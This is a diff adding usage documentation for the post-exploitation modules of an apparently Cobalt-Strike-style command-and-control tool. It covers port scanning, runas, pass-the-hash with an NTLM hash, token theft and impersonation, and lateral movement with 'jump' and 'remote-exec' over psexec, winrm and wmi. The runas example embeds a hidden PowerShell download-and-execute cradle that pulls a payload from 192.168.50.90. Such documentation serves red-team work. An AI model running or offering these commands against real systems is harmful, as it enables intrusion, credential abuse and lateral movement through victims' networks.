@@ -1,0 +1,38 @@
+portscan: Performs a portscan on a spesific target.
+portscan Usage:
+portscan [ip or ip range] [ports]
+i.e.
+
+portscan 172.16.48.0/24 1-2048,3000,8080
+The above command will scan the entire 172.16.48.0/24 subnet on ports 1 to 2048, 3000 and 8080. This can be utilized for single IPs as well.
+
+runas: A wrapper of runas.exe, using credentials you can run a command as another user.
+runas Usage:
+runas [DOMAIN\user] [password] [command] [arguments]
+i.e.
+
+runas CORP\Administrator securePassword12! Powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.90:80/filename'))"
+pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process.
+❗ This module needs Administrator privileges.
+pth Usage:
+pth [DOMAIN\user] [hash]
+pth Administrator 97fc053bc0b23588798277b22540c40d
+pth CORP\Administrator 97fc053bc0b23588798277b22540c40d
+steal_token: Steal a token from a specified process.
+make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
+jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target.
+❗ The jump module will use the current delegation/impersonation token to authenticate on the remote target.
+💪 We can combine the jump module with the make_token or pth module for a quick "jump" to another target on the network.
+jump Usage:
+jump [psexec64,psexec,psexec_psh,winrm64,winrm] [server/workstation] [listener]
+i.e.
+
+jump psexec64 DC01 Lab-HTTPS
+jump winrm WS04 Lab-SMB
+jump psexec_psh WS01 Lab-DNS
+...
+remote-exec: Execute a command on a remote target using psexec, winrm or wmi.
+❗ The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target.
+remote-exec Usage:
+remote-exec [method] [target] [command]
+ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts. It gives you basic ssh functionality with some additional post exploitation modules.
